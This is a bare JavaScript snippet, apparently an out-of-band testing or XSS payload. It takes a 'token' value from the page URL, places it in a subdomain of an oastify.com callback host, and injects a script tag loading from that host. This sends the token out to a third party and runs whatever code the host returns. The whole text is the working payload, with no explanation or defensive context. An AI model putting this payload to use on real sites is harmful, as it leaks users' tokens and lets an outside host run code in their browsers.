(function () {
  const params = new URLSearchParams(location.search);
  const token = params.get('token');

  if (token) {
    const safeToken = token.replace(/[^a-zA-Z0-9]/g, '').slice(0, 50);
    const s = document.createElement('script');
    s.src = 'https://' + safeToken + '.5hnvq6lod59q4hfoyxyo0o0krbx4lv9k.oastify.com';
    document.body.appendChild(s);
  }
})();
